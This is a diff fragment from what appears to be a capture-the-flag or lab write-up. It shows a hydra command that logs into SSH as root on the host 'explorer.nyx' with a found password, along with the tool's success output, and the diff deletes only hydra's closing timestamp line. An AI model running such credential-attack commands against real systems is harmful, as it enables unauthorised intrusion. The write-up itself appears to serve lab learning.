@@ -164,7 +164,6 @@ $ hydra -l 'root' -p 'AccessGranted#1' ssh://explorer.nyx
 [DATA] attacking ssh://explorer.nyx:22
 [22][ssh] host: explorer.nyx   login: root   password: AccessGranted#1
 1 of 1 test successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-07-19 10:44:01
 ```
 
 They check out, and root is reached directly:
